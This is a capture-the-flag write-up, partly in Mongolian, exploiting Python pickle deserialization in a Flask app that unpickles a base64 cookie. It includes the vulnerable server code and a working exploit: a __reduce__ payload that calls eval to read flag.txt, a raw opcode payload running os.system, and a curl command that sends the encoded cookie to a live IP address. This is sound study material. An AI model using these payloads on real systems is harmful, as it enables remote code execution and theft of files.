# Pickle loads - Insecure Deserialization

## Pickle loads

**Source code:**

```python
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"

    return "Sain bain uu  %s <!-- Cookie: user=Guest -->" % username

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)
```

### Яаж ажилласан бэ?

Чиний сүүлийн payload-ийг задлаад харвал:

- **Dictionary үүсгэсэн:** `username` гэдэг түлхүүр (key) дотор флаг-ыг утга (value) болгож хийсэн.
- **`eval` ашигласан:** Python-ий `eval` функц нь доторх кодыг нь ажиллуулаад үр дүнг нь шууд тухайн хувьсагчид оноож өгдөг.
- **Файлыг уншсан:** `open('flag.txt').read()` гэдэг команд флаг-ыг текст хэлбэрээр уншиж, веб хуудасны `%s` (username) хэсэгт орлуулж хэвлэсэн байна.

### 2. Өмнөхүүд нь яагаад болохгүй байсан бэ?

- `os.system` ашиглахад тэр нь командыг ажиллуулдаг ч үр дүнг нь (`cat`ын гаралтыг) веб рүү "username" болгож буцааж өгдөггүй, зөвхөн ажиллагааны төлөв (0 эсвэл 1)-ийг буцаадаг. Тийм болохоор "Sain bain uu 0" эсвэл "Guest" гэж харагдаад байсан хэрэг.
- Харин `eval` болон `open().read()` нь файлын агуулгыг шууд "username" хувьсагчид атгуулсан учраас флаг чинь дэлгэц дээр ил гарч ирлээ.

**Exploit code:**

```python
# -*- coding: utf-8 -*-
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        # Python 2-т `file('flag.txt').read()` гэж уншиж болдог
        # Энэ нь ямар нэгэн команд ажиллуулахгүй, зөвхөн файл уншина
        return (list, ()) # Түр зуур хоосон утга

# Python 2-ын pickle-ийн "opcode" ашиглан гараар пайлоад бэлдье.
# Энэ нь илүү хүчтэй: flag.txt-г нээгээд, уншаад, username-д онооно.
payload = "cos\nsystem\n(S'cat flag.txt > flag.txt.copy'\ntR." # Туршилт 1

# Гэхдээ хамгийн баталгаатай Dictionary хувилбар:
class FlagReader(object):
    def __reduce__(self):
        # builtin 'file' функцийг ашиглан flag.txt-г унших
        return (eval, ("open('flag.txt').read()",))

exploit_dict = {
    "username": FlagReader()
}

final_payload = base64.b64encode(pickle.dumps(exploit_dict, protocol=0))
print("Payload:")
print(final_payload)
```

**Send to server using cookie**

[image]

**Exploited**

```bash
curl -s -v http://139.162.5.230:10292/ --cookie 'user=KGRwMApWdXNlcm5hbWUKcDEKY19fYnVpbHRpbl9fCmV2YWwKcDIKKFZvcGVuKCdmbGFnLnR4dCcpLnJlYWQoKQpwMwp0cDQKUnA1CnMu'
```

[image]
